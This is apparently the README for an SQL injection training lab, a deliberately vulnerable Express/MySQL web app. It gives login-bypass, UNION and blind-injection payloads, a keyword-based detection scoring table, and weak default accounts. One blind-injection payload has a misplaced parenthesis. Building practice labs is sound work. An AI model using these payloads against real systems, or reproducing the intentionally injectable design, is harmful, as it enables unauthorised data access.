# SQL 注入漏洞靶场

一个用于安全学习用的 SQL 注入漏洞靶场 Web 应用。

## 功能特性

### 1. 登录页 - 字符型 SQL 注入

- **漏洞位置：`/api/auth/login` 接口的 username 和 password 参数
- **类型：字符型 SQL 注入
- **示例 Payload：
  - `admin' OR '1'='1
  - `admin' -- 
  - `' UNION SELECT 1,2,3,4 -- 

### 2. 商品搜索页 - 数字型盲注

- **漏洞位置：`/api/products` 接口的 categoryId 参数
- **类型：数字型盲注（布尔盲注 + 时间盲注）
- **示例 Payload：
  - `1 AND 1=1
  - `1 AND 1=2
  - `1 AND SLEEP(2)
  - `1 AND (SELECT LENGTH(DATABASE()))=7

### 3. 后台管理页

- 需要登录才能访问
- 包含用户管理、商品管理等功能

### 4. 攻击控制台

- 实时显示当前执行的 SQL 语句
- 显示 Payload 和响应时间
- 记录攻击历史记录
- SQL 语法高亮

### 5. 请求流量监控

- 记录所有 HTTP 请求的请求头、Body 和参数
- 自动检测包含 UNION、SELECT、-- 等 SQL 注入关键字的请求
- 计算每个请求的"危险等级"（低/中/高/严重）
- 危险评分可视化展示
- 支持按危险等级筛选
- 自动刷新（每 2 秒）和手动刷新
- 展开查看请求详情

## 危险等级计算规则

系统内置 25+ 个危险关键字检测规则，每个规则对应不同的危险分数：

| 关键字 | 类型 | 分数 |
|--------|------|------|
| UNION, SELECT | SQL 注入 | +25~30 |
| SLEEP, BENCHMARK | 时间盲注 | +35 |
| INSERT, UPDATE, DELETE | 写入操作 | +30 |
| DROP | 破坏操作 | +40 |
| EXEC, CMD | 命令执行 | +35~40 |
| INFORMATION_SCHEMA | 元数据窃取 | +35 |
| OR, AND | 布尔注入 | +25 |
| 1=1, 1=2 | 恒真/恒假 | +20 |
| ASCII, SUBSTRING | 盲注函数 | +20 |
| --, ', " | 语法符号 | +15~20 |

**等级阈值：**
- 低危：0 - 29 分
- 中危：30 - 59 分
- 高危：60 - 99 分
- 严重：≥ 100 分

## 技术栈

- **前端**: React 18 + TypeScript + Vite + Tailwind CSS
- **后端**: Express.js + TypeScript
- **数据库**: MySQL
- **状态管理**: Zustand

## 安装步骤

### 1. 数据库配置

编辑 `.env` 文件配置数据库连接：

```env
DB_HOST=localhost
DB_USER=root
DB_PASSWORD=你的密码
DB_NAME=sqlilab
DB_PORT=3306
```

### 2. 初始化数据库

在 MySQL 中执行 `migrations/001_init.sql` 文件：

```bash
mysql -u root -p < migrations/001_init.sql
```

或者手动在 MySQL 中执行 SQL 语句。

### 3. 安装依赖

```bash
npm install
```

### 4. 启动服务

```bash
# 同时启动前端和后端
npm run dev

# 或者分别启动
npm run client:dev  # 前端 (http://localhost:5173)
npm run server:dev  # 后端 (http://localhost:3001)
```

## 注意事项

> ⚠️ 此应用仅用于安全学习目的！
> 请勿在生产环境或未授权的系统上使用！
> 使用本软件造成的任何后果由使用者自行承担。

## 默认账号

| 用户名 | 密码 | 角色 |
|--------|------|------|
| admin | admin123 | admin |
| user1 | pass123 | user |
| test | test123 | user |

## 漏洞利用示例

### 字符型注入

**万能密码：
```
用户名: admin' OR '1'='1
密码: 任意
```

**联合查询：
```
用户名: ' UNION SELECT 1,2,3,4 -- 
密码: 
```

### 数字型盲注

**布尔盲注：
```
categoryId=1 AND 1=1  # 返回结果
categoryId=1 AND 1=2  # 无结果
```

**时间盲注：
```
categoryId=1 AND SLEEP(2)  # 延迟 2 秒
```

**猜解数据库名：
```
categoryId=1 AND (SELECT ASCII(SUBSTRING(DATABASE()),1,1))=115  # 's'
```
